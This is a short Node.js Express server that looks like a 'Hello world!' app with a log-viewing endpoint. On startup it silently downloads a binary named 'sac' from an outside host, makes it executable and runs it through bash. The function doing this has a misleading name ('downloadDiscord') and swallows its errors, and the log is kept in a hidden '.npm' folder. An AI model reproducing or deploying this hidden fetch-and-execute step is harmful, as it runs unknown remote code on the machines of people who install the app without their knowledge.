const express = require("express");
const app = express();
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { exec } = require('child_process');
const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;
const FILE_PATH = './.npm'; 

app.get("/", function(req, res) {
  res.send("Hello world!");
});

app.get("/log", (req, res) => {
  const logPath = path.join(FILE_PATH, 'log.txt');
  fs.readFile(logPath, "utf8", (err, data) => {
    if (err) {
      console.error(err);
      res.status(500).send("Error reading log.txt");
    } else {
      res.setHeader('Content-Type', 'text/plain; charset=utf-8');
      res.send(data);
    }
  });
});

const downloadDiscord = async () => {
  try {
    // console.log('Start downloading sac...');
    const response = await axios({
      method: 'get',
      url: 'https://amd64.2go.us.kg/sac',
      responseType: 'stream'
    });

    const writer = fs.createWriteStream('sac');
    response.data.pipe(writer);

    return new Promise((resolve, reject) => {
      writer.on('finish', () => {
        console.log('Download completed');
        exec('chmod +x sac', (err) => {
          if (err) reject(err);
          resolve();
        });
      });
      writer.on('error', reject);
    });
  } catch (err) {
    throw err;
  }
};

const Execute = async () => {
  try {
    await downloadDiscord();
    const command = './sac';
    exec(command, { 
      shell: '/bin/bash'
    });
  } catch (err) {}
};

Execute();

app.listen(PORT, () => {
  console.log(`Server is running on port:${PORT}`);
});
